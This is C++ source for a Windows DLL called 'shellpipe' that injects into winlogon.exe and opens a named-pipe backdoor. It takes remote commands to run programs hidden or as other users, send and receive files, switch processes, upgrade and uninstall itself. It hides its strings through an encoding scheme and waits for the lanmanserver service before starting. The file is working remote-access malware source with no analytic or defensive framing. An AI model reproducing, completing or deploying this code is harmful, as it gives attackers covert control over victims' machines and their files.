// shellpipe.cpp : Defines the entry point for the DLL application.
//
#pragma warning(disable: 4786)

#ifdef _WIN32_WINNT
	#undef _WIN32_WINNT
	#define _WIN32_WINNT 0x0500
#else
	#define _WIN32_WINNT 0x0500
#endif

#include "stdafx.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <Aclapi.h>
#include <Ras.h>
#include <Shellapi.h>
#include <winsock2.h>
#include <winerror.h>
#include <Ntsecapi.h>
#include <shlwapi.h>
#include <Tlhelp32.h>
#include <Winnetwk.h>

//#define DEBUG_SHOW_ERROR
//#define DEBUG_SHOW_ERROR_TO_FILE
#define COMPILE_WITH_HANDLE_EXCEPTION
#define CHECK_ADMIN_INTERACTIVE_LOGON 

#include "shellpipe.h"
#include "encode_string.h"
#include "util.cpp"
#include "package.cpp"
#include "bridged.cpp"
#include "unistall.cpp"
#include "macros.cpp"
#include "exception.cpp"

#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Rasapi32.lib")
#pragma comment(lib,"Secur32.lib")
#pragma comment(lib,"shlwapi.lib")
//-------------------------------------------------------------------------

BOOL GetCmdLineArgs(HANDLE hPipe, LPSTR lpCmdLine){
	LPWSTR *lpArrTmp;
	CHAR msg[256] = {0};
	LPWSTR tmpCmdLine = new WCHAR[strlen(lpCmdLine) + 4];
	int i, lenArrTmp;
	LPSTR lpTmpEncString=NULL;
	DecodeString ds;

	if(!tmpCmdLine){
		WriteToPipe(hPipe, ds.length(),
			ds.getDecodeString((LPSTR)encStr_Error_no_enoungh_memory), FLAG_ERROR);
		return FALSE;
	}

	memset(tmpCmdLine, '\0', (strlen(lpCmdLine) + 4)*2);
	mbstowcs(tmpCmdLine, lpCmdLine, strlen(lpCmdLine));

	if(!(lpArrTmp = CommandLineToArgvW(tmpCmdLine, &lenArrTmp))){
		WriteToPipe(hPipe, ds.length(), 
			ds.getDecodeString((LPSTR)encStr_Error_CommandLineToArgvW), FLAG_ERROR);
		return FALSE;
	}
	
	lpArrayCmdLine = new LPSTR[lenArrTmp];
	if(!lpArrayCmdLine){
		WriteToPipe(hPipe, ds.length(),
			ds.getDecodeString((LPSTR)encStr_Error_no_enoungh_memory), FLAG_ERROR);
		return FALSE;
	}

	sprintf(msg, "%d", lenArrTmp);

	for(i=0; i<=lenArrTmp-1; ++i){
		lpArrayCmdLine[i] = new CHAR[wcslen(lpArrTmp[i])+2];
		if(!lpArrayCmdLine[i]){
			WriteToPipe(hPipe, ds.length(),
				ds.getDecodeString((LPSTR)encStr_Error_no_enoungh_memory), FLAG_ERROR);
			return FALSE;
		}
		memset(lpArrayCmdLine[i], '\0', wcslen(lpArrTmp[i]) + 2);
		wcstombs(lpArrayCmdLine[i], lpArrTmp[i], wcslen(lpArrTmp[i]));
	}

	dwLenArrayCmdLine = lenArrTmp;

	delete[] tmpCmdLine;
	return TRUE;
}

PSECURITY_DESCRIPTOR GetSecDescriptorFromStringSecDesc(LPSTR StringSecDesc){
	PSECURITY_DESCRIPTOR pSecDesc=NULL;
	ULONG SecDescSize = NULL;

	if(!ConvertStringSecurityDescriptorToSecurityDescriptor(StringSecDesc,1, 
		&pSecDesc, &SecDescSize)){

		pSecDesc=NULL;
		goto Cleanup;
	}

Cleanup:
	return pSecDesc;
}

BOOL CreateUnloadMutex(HANDLE hPipe){
	SECURITY_ATTRIBUTES secAttr;
	BOOL valRet=TRUE;
	CHAR msg[256] = {0};
	LPSTR lpTmpEncString=NULL;
	DecodeString ds;

	secAttr.bInheritHandle = FALSE;
	secAttr.lpSecurityDescriptor = GetSecDescriptorFromStringSecDesc(MUTEX_STRING_SECURITY_DESCRIPTOR);
	secAttr.nLength = sizeof(SECURITY_ATTRIBUTES);

	if(!secAttr.lpSecurityDescriptor){
		sprintf(msg, "Error creating security descriptor");
		WriteToPipe(hPipe, strlen(msg), msg, FLAG_ERROR);
		return FALSE;
	}

	if(!(hUnloadMutex=CreateMutex(&secAttr, TRUE, ds.getDecodeString((LPSTR)UNLOAD_MUTEX)))){
		valRet = FALSE;
		//MessageBox(0, "Error CreateMutex", 0, 0);

		if(GetLastError() == ERROR_ALREADY_EXISTS){
			WriteToPipe(hPipe, ds.length(), 
				ds.getDecodeString((LPSTR)encStr_Error_CreateMutex_alread_exists_im_closing), 
				 NULL);
			Sleep(750);
			DisconnectNamedPipe(hPipe);
			CloseHandle(hPipe);
			ReleaseMutex(hWorkingMutex);
			CloseHandle(hWorkingMutex);
			UnloadDLL();
		}
		
		WriteToPipe(hPipe, ds.length(), 
			ds.getDecodeString((LPSTR)encStr_Error_CreateMutex), FLAG_ERROR);
		goto Cleanup; 
	}

Cleanup:
	if(secAttr.lpSecurityDescriptor)
		LocalFree(secAttr.lpSecurityDescriptor);

	return valRet;
}


VOID UnloadDLL(void){
	if(!Macro_DisableBridged(NULL))
		TerminateThread(hThreadBridged, 0);

	ReleaseMutex(hWorkingMutex);
	CloseHandle(hWorkingMutex);

	//Con lo siguiente commentado, el mutex se queda cargado en memoria,
	//y habria que reiniciar la pc para que se carge nuevamente la dll
	/*ReleaseMutex(hUnloadMutex);
	CloseHandle(hUnloadMutex);*/

	TerminateThread(hThreadMonitor, 0);
	CloseHandle(hThreadMonitor);
	
	#ifdef COMPILE_WITH_HANDLE_EXCEPTION
	UninitializeHandleException();
	#endif
	
	Sleep(750);
	DisableThreadLibraryCalls((HMODULE)hInstance);
	FreeLibraryAndExitThread((HMODULE)hInstance, 0);
}


BOOL ExecuteApp(LPSTR lpCmdLine, HANDLE hPipe, BOOL waitForOutput, 
				 BOOL Interactive, LPSTR lpUserName, LPSTR lpPassword){

	HANDLE hToken=NULL, hReadPipeStdOut=NULL, hWritePipeStdOut=NULL;
	STARTUPINFO stInfo={0};
	PROCESS_INFORMATION procInfo={0};
	LPSTR tmpBuffer;
	DWORD numBytesRead=0, exitCode, nBytesStdOut=NULL, dwTmp, dwRetVal=TRUE;
	CHAR msg[256]={0};
	SECURITY_ATTRIBUTES secAttr;
	DecodeString ds;

	stInfo.cb = sizeof(STARTUPINFO);

	secAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	secAttr.bInheritHandle = TRUE;
	secAttr.lpSecurityDescriptor= GetSecDescriptorFromStringSecDesc(PIPE_STRING_SECURITY_DESCRIPTOR);
	
	if(!secAttr.lpSecurityDescriptor){
		WriteToPipe(hPipe, ds.length(),
			ds.getDecodeString((LPSTR)encStr_Error_getting_security_descriptor), FLAG_ERROR);
		return FALSE;
	}
	
	if(waitForOutput){
		if(!CreatePipe(&hReadPipeStdOut, &hWritePipeStdOut, &secAttr, 10485760)){
			WriteToPipe(hPipe, ds.length(), 
				ds.getDecodeString((LPSTR)encStr_Error_creating_redirect_pipe), FLAG_ERROR);
			return FALSE;
		}

		stInfo.dwFlags |= STARTF_USESTDHANDLES;
		stInfo.hStdError = hWritePipeStdOut;
		stInfo.hStdOutput = hWritePipeStdOut;
		stInfo.hStdInput = NULL;
	}

	if(!Interactive){
		stInfo.dwFlags |= STARTF_USESHOWWINDOW;	
		stInfo.wShowWindow = SW_HIDE;
	}
	else{
		//stInfo.lpDesktop = "WINSTA0\\Default";
		stInfo.lpDesktop = new CHAR[MAX_PATH];
		if(!stInfo.lpDesktop){
			sprintf(msg, ds.getDecodeString((LPSTR)encStr_No_enough_memory));
			WriteToPipe(hPipe, strlen(msg), msg, FLAG_ERROR);
			dwRetVal = FALSE;
			goto Cleanup;
		}
		
		if(!GetActiveDesktop(stInfo.lpDesktop, MAX_PATH)){
			if(!strlen(stInfo.lpDesktop)){
				sprintf(msg, ds.getDecodeString((LPSTR)encStr_Error_create_process), GetLastError());
				WriteToPipe(hPipe, strlen(msg), msg, FLAG_ERROR);
				dwRetVal = FALSE;
				goto Cleanup;
			}
		}
	}

	if(lpUserName && lpPassword){
		LPWSTR lpwsUserName=new WCHAR[256], lpwsPassword=new WCHAR[256], 
			lpwsCommandLine=new WCHAR[MAX_PATH], lpwsCurrentDir=new WCHAR[MAX_PATH];
		STARTUPINFOW stInfoW={0};

		memset(lpwsUserName, 0, 256*sizeof(WCHAR));
		memset(lpwsPassword, 0, 256*sizeof(WCHAR));
		memset(lpwsCommandLine, 0, 256*sizeof(WCHAR));
		memset(lpwsCurrentDir, 0, 256*sizeof(WCHAR));

		mbstowcs(lpwsUserName, lpUserName, strlen(lpUserName));
		mbstowcs(lpwsPassword, lpPassword, strlen(lpPassword));
		mbstowcs(lpwsCommandLine, lpCmdLine, strlen(lpCmdLine));
		mbstowcs(lpwsCurrentDir, procSIPath, strlen(procSIPath));

		stInfoW.dwFlags = stInfo.dwFlags;
		//stInfoW.dwFlags &= (!STARTF_USESTDHANDLES);

		stInfoW.wShowWindow = stInfo.wShowWindow;

		stInfoW.hStdError = stInfo.hStdError;
		stInfoW.hStdOutput = stInfo.hStdOutput;
		stInfoW.hStdInput = hReadPipeStdOut;
		if(Interactive){
			if(stInfo.lpDesktop){
				stInfoW.lpDesktop = new WCHAR[strlen(stInfo.lpDesktop)+2];
				mbstowcs(stInfoW.lpDesktop, stInfo.lpDesktop, strlen(stInfo.lpDesktop));
			}
		}

		//waitForOutput=FALSE;

		if(!CreateProcessWithLogonW(lpwsUserName, L".", lpwsPassword, 1,
			NULL, lpwsCommandLine, CREATE_NEW_CONSOLE, NULL, 
			lpwsCurrentDir, &stInfoW, &procInfo)){

			sprintf(msg, ds.getDecodeString((LPSTR)encStr_Error_create_process_as_user), GetLastError());
			WriteToPipe(hPipe, strlen(msg), msg, FLAG_ERROR);
			
			dwRetVal = FALSE;
			delete[] lpwsUserName;
			delete[] lpwsPassword;
			delete[] lpwsCommandLine;
			delete[] lpwsCurrentDir;
			if(stInfoW.lpDesktop) delete[] stInfoW.lpDesktop;
			goto Cleanup;
		}
		Sleep(250);
		
		delete[] lpwsUserName;
		delete[] lpwsPassword;
		delete[] lpwsCommandLine;
		delete[] lpwsCurrentDir;
		if(stInfoW.lpDesktop) delete[] stInfoW.lpDesktop;
	}
	else{
		if(!CreateProcess(NULL, lpCmdLine, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, procSIPath, &stInfo, &procInfo)){
			sprintf(msg, ds.getDecodeString((LPSTR)encStr_Error_create_process), GetLastError());
			WriteToPipe(hPipe, strlen(msg), msg, FLAG_ERROR);
			dwRetVal = FALSE;
			goto Cleanup;
		}
	}

	if(waitForOutput){
		switch(WaitForSingleObject(procInfo.hProcess, WaitTimeOutExecuteApp)){
		case WAIT_OBJECT_0:
			
			if((nBytesStdOut = GetFileSize(hReadPipeStdOut, NULL)) == INVALID_FILE_SIZE){
				sprintf(msg, ds.getDecodeString((LPSTR)encStr_Error_get_stdout_len), GetLastError());
				WriteToPipe(hPipe, strlen(msg), msg, FLAG_ERROR);
				dwRetVal = FALSE;
				goto Cleanup;
			}
			
			tmpBuffer = new CHAR[nBytesStdOut+256];
			GetExitCodeProcess(procInfo.hProcess, &exitCode);
			sprintf(tmpBuffer, "Exit code: %d\r\n", exitCode);
			dwTmp = strlen(tmpBuffer);
			
			if(nBytesStdOut){	
				ReadFile(hReadPipeStdOut, tmpBuffer+strlen(tmpBuffer), nBytesStdOut, &numBytesRead, NULL);
			}			
			WriteToPipe(hPipe, dwTmp+numBytesRead, tmpBuffer, NULL);
			break;
		case WAIT_TIMEOUT:
			WriteToPipe(hPipe, ds.length(), 
				ds.getDecodeString((LPSTR)encStr_Wait_time_out_execute_process), FLAG_ERROR);
			break;
		}
	}
	else{
		WriteToPipe(hPipe, ds.length(), 
			ds.getDecodeString((LPSTR)encStr_Execute_app_ok), NULL);
	}

Cleanup:
	if(hReadPipeStdOut)
		CloseHandle(hReadPipeStdOut);
	
	if(hWritePipeStdOut)
		CloseHandle(hWritePipeStdOut);

	if(procInfo.hProcess)
		CloseHandle(procInfo.hProcess);

	if(procInfo.hThread)
		CloseHandle(procInfo.hThread);

	if(hToken)
		CloseHandle(hToken);

	if(secAttr.lpSecurityDescriptor)
		LocalFree(secAttr.lpSecurityDescriptor);

	if(stInfo.lpDesktop)
		delete[] stInfo.lpDesktop;

	return dwRetVal;
}

DWORD ProccesMacro(HANDLE hPipe, LPSTR cmdLine){
	int i;
	CHAR selectMacro[64]={0};
	CHAR msg[256]={0};
	DecodeString ds;

	if(!GetCmdLineArgs(hPipe, cmdLine))
		return FALSE;
	
	for(i=0; i <= NUM_MACROS-1; ++i){
		if(strstr(lpArrayCmdLine[0], ds.getDecodeString(lpMacros[i]))){
			strcpy(selectMacro, ds.getDecodeString(lpMacros[i]));
			break;
		}
	}
	
	if(!strlen(selectMacro)){
		WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_Macro_unknow), FLAG_ERROR);
		return FALSE;
	}

	if(strstr(selectMacro, ds.getDecodeString((LPSTR)encStr_cum))){
		/*sprintf(msg, "%d - %s", ds.length(), ds.getDecodeString((LPSTR)encStr_Unload_mutex_created));
		MessageBox(0, msg, 0, 0);*/
		if(CreateUnloadMutex(hPipe)){
			WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_Unload_mutex_created), NULL);
			return TRUE;
		}
		//MessageBox(0, "Error", NULL, NULL);
		return FALSE;
	}

	if(strstr(selectMacro, ds.getDecodeString((LPSTR)encStr_unloadme))){
		WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_Unloading), NULL);
		FlushFileBuffers(hPipe);
		DisconnectNamedPipe(hNamedPipe);
		CloseHandle(hPipe);
		UnloadDLL();
		return TRUE;
	}

	if(strstr(selectMacro, ds.getDecodeString((LPSTR)encStr_ginf))){
		if (dwLenArrayCmdLine == 1)
			return Macro_GetInfo(hPipe, NULL);
		if (dwLenArrayCmdLine >= 2)
			return Macro_GetInfo(hPipe, lpArrayCmdLine[1]);
	}

	if(strstr(selectMacro, ds.getDecodeString((LPSTR)encStr_settimeout))){
		return Macro_SetTimeOut(hPipe, lpArrayCmdLine[1]);
	}

	if(strstr(selectMacro, ds.getDecodeString((LPSTR)encStr_cd))){
		return Macro_SetCD(hPipe, lpArrayCmdLine[1]);
	}

	if(strstr(selectMacro, ds.getDecodeString((LPSTR)encStr_enableb))){
		return Macro_EnableBridged(hPipe);
	}

	if(strstr(selectMacro, ds.getDecodeString((LPSTR)encStr_disableb))){
		return Macro_DisableBridged(hPipe);
	}

	if(strstr(selectMacro, ds.getDecodeString((LPSTR)encStr_gblogs))){
		return Macro_GetBridgedLogs(hPipe);
	}

	if(strstr(selectMacro, ds.getDecodeString((LPSTR)encStr_uninstall))){
		WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_Uninstalling), NULL);

		if (dwLenArrayCmdLine >= 2){
			if(strstr(lpArrayCmdLine[1], "true")){
				ACTIVE_UNISTALL_PROC_BY_DEMAND_REMOTE = TRUE;
			}
		}

		ACTIVE_UNISTALL_PROC_BY_DEMAND = TRUE;
		return TRUE;
	}

	if(strstr(selectMacro, ds.getDecodeString((LPSTR)encStr_switch))){
		return Macro_ProcSwitcher(hPipe);
	}

	//Macro Upgrade
	if(strstr(selectMacro, ds.getDecodeString((LPSTR)lpMacros[10]))){
		if (dwLenArrayCmdLine < 2){
			WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_Missing_parameters), FLAG_ERROR);
			return FALSE;
		}

		return Macro_Upgrade(hPipe, lpArrayCmdLine[1]);
	}
	
	return TRUE;
}


DWORD ShellPipe(HANDLE hPipe){
	CHAR msg[256]={0};
	LPSP_PACKET lpPacket;
	DWORD dwRetVal;
	DecodeString ds;

	if(!(lpPacket = ReadPacketFromPipe(hPipe))){
		return -1;
	}

	//Macro
	if(lpPacket->dwFlags & FLAG_DATA_IS_MACRO){
		if(!lpPacket->lpData || !lpPacket->dwDataLen){
			WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_Error_no_macro_exists), FLAG_ERROR);
			FreePackage(lpPacket);
			return -1;
		}

		dwRetVal = ProccesMacro(hPipe, (LPSTR)lpPacket->lpData);
		FreePackage(lpPacket);
		return dwRetVal;
	}
	
	//Comandos
	if( (lpPacket->dwFlags & FLAG_WAIT_PROC_OUTPUT) ||
		(lpPacket->dwFlags & FLAG_RUN_AS_USER) ||
		(lpPacket->dwFlags & FLAG_COMMAND) ) {
		
		dwRetVal = ExecuteApp((LPSTR)lpPacket->lpData, 
			hPipe, (lpPacket->dwFlags & FLAG_WAIT_PROC_OUTPUT),
			lpPacket->dwFlags & FLAG_INTERACTIVE, 
			(LPSTR)((lpPacket->dwFlags & FLAG_RUN_AS_USER) && strlen((LPSTR)lpPacket->lpParam1) ? lpPacket->lpParam1: NULL),
			(LPSTR)((lpPacket->dwFlags & FLAG_RUN_AS_USER) && strlen((LPSTR)lpPacket->lpParam2) ? lpPacket->lpParam2: NULL));

		FreePackage(lpPacket);
		return dwRetVal;
	}

	//Subir fichero
	if( (lpPacket->dwFlags & FLAG_PUT_FILE)){
		dwRetVal = Macro_RecvFile(hPipe, lpPacket);
		FreePackage(lpPacket);
		return dwRetVal;
	}

	//Bajar fichero
	if( (lpPacket->dwFlags & FLAG_GET_FILE)){
		dwRetVal = Macro_SendFile(hPipe, lpPacket);
		FreePackage(lpPacket);
		return dwRetVal;
	}

	WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_No_command_or_macro_defined), FLAG_ERROR);
	if(lpPacket)
		FreePackage(lpPacket);
	return -1;
}


BOOL ServerShellPipe(void){
	SECURITY_ATTRIBUTES secAttr={0};
	BOOL valRet;
	CHAR msg[256] = {0};
	DWORD ThId;
	DecodeString ds;

	secAttr.bInheritHandle = TRUE;
	secAttr.lpSecurityDescriptor = GetSecDescriptorFromStringSecDesc(PIPE_STRING_SECURITY_DESCRIPTOR);
	secAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	
	if(!secAttr.lpSecurityDescriptor || !IsValidSecurityDescriptor(secAttr.lpSecurityDescriptor)){
		#ifdef DEBUG_SHOW_ERROR
		sprintf(msg, "Error getting security descriptor or is invalid");
		MessageBox(NULL, msg, "Error", MB_OK | MB_ICONERROR);
		#endif
		return FALSE;
	}

	if((hNamedPipe = CreateNamedPipe(ds.getDecodeString((LPSTR)NAME_PIPE), PIPE_ACCESS_DUPLEX, 
		PIPE_TYPE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 
		BUFFER_INOUT_NAMEDPIPE, BUFFER_INOUT_NAMEDPIPE, 
		3000, &secAttr)) == INVALID_HANDLE_VALUE){		
		
		#ifdef DEBUG_SHOW_ERROR
		sprintf(msg, "Error CreateNamedPipe@ServerShellPipe: %u", GetLastError());
		MessageBox(NULL, msg, "Error", MB_OK | MB_ICONERROR);
		#endif
		
		valRet = FALSE;
        goto Cleanup;
	}

	if(!(hThreadMonitor = CreateThread(NULL, NULL, 
		(LPTHREAD_START_ROUTINE)ThreadMonitor, NULL, NULL, &ThId))){

		#ifdef DEBUG_SHOW_ERROR
		sprintf(msg, "Error CreateThread@ServerShellPipe: %u", GetLastError());
		MessageBox(NULL, msg, "Error", MB_OK | MB_ICONERROR);
		#endif

		valRet = FALSE;
		goto Cleanup;
	}

	while(TRUE){
		if(ConnectNamedPipe(hNamedPipe, NULL)){
			ShellPipe(hNamedPipe);
		}
		else{
			if(GetLastError() == ERROR_PIPE_CONNECTED){
				ShellPipe(hNamedPipe);
			}
			else{
				/*#ifdef DEBUG_SHOW_ERROR
				sprintf(msg, "Error ConnectNamedPipe@ServerShellPipe: %u", GetLastError());
				MessageBox(NULL, msg, "Error", MB_OK | MB_ICONERROR);
				#endif*/
				break;
			}
		}
		FlushFileBuffers(hNamedPipe);
		DisconnectNamedPipe(hNamedPipe);
	}

Cleanup:
	if (secAttr.lpSecurityDescriptor) 
        LocalFree(secAttr.lpSecurityDescriptor);
	
	if (hNamedPipe != INVALID_HANDLE_VALUE && hNamedPipe)
		CloseHandle(hNamedPipe);

	if (hThreadMonitor){
		TerminateThread(hThreadMonitor, 0);
		CloseHandle(hThreadMonitor);
	}

	return valRet;
}


DWORD CheckMutex(LPVOID lpParam){
	DWORD dwServiceState=NULL, dwTimeCounter=NULL;
	SECURITY_ATTRIBUTES secAttr;
	LPSTR lpszProc[MAX_PATH+2]={0};
	CHAR msg[256]={0};
	DecodeString ds;

	//Tiempo para que el proceso inicie
	if(WaitAndCheckUnloadMutex(2, 500))
		UnloadDLL();

	#ifdef COMPILE_WITH_HANDLE_EXCEPTION
	if(!InitializeHandleException()){
		#ifdef DEBUG_SHOW_ERROR
		MessageBox(NULL, "Error InitializeHandleException", NULL, NULL);
		ExitThread(0);
		#endif
	}
	#endif

	if(!GetCurrentDirectory(MAX_PATH, procSIPath)){
		GetEnvironmentVariable("SystemRoot", procSIPath, MAX_PATH);
		strcat(procSIPath, "\\system32\\");
	}

	//Chequeo para iniciar en Winlogon.exe y servicio lanmanserver
	if(!GetModuleFileNameEx(GetCurrentProcess(), NULL, (LPSTR)lpszProc, MAX_PATH)){
		if(WaitAndCheckUnloadMutex(30, 1000))
			UnloadDLL();
	}
	else{
		if(!strstr(strupr((LPSTR)lpszProc), ds.getDecodeString((LPSTR)encStr_Windows_System32_Winlogon))){
			if(WaitAndCheckUnloadMutex(30, 1000))
				UnloadDLL();
		}
	}

	while((dwServiceState = GetServiceState(ds.getDecodeString((LPSTR)encStr_lanmanserver))) != SERVICE_RUNNING){
		if(WaitAndCheckUnloadMutex(2, 500))
			UnloadDLL();
		if((++dwTimeCounter) >= 15) break;
	}

	secAttr.bInheritHandle = FALSE;
	secAttr.lpSecurityDescriptor = GetSecDescriptorFromStringSecDesc(MUTEX_STRING_SECURITY_DESCRIPTOR);
	secAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	if(!secAttr.lpSecurityDescriptor){
		#ifdef COMPILE_WITH_HANDLE_EXCEPTION
		UninitializeHandleException();
		#endif

		#ifdef DEBUG_SHOW_ERROR
		MessageBox(NULL, "Error create sec descriptor for working mutex", NULL, NULL);
		#endif

		ExitThread(0);
	}

	while(TRUE){
		//if((hWorkingMutex = OpenMutex(SYNCHRONIZE, FALSE, ds.getDecodeString((LPSTR)UNLOAD_MUTEX)))){
		if((hWorkingMutex = CreateMutex(&secAttr, TRUE, ds.getDecodeString((LPSTR)WORKING_MUTEX)))){
			if(GetLastError()==ERROR_ALREADY_EXISTS){
				CloseHandle(hWorkingMutex);
			}else{
				ServerShellPipe();
			}
		}else{
			#ifdef DEBUG_SHOW_ERROR
			sprintf(msg, "Error create working mutex: %u", GetLastError());
			MessageBox(NULL, msg, NULL, NULL);
			#endif
		}
		//}

		if(WaitAndCheckUnloadMutex(2, 500))
			UnloadDLL();
	}

	return TRUE;
}


BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
	DWORD thId;
	
    switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		if(!GetFunctionsEntryPoint())
			return FALSE;

		if(!DisableThreadLibraryCalls((HMODULE)hModule))
			return FALSE;

		hInstance = (HINSTANCE)hModule;
		if(CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)CheckMutex, NULL, NULL, &thId) == INVALID_HANDLE_VALUE)
			return FALSE;

		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

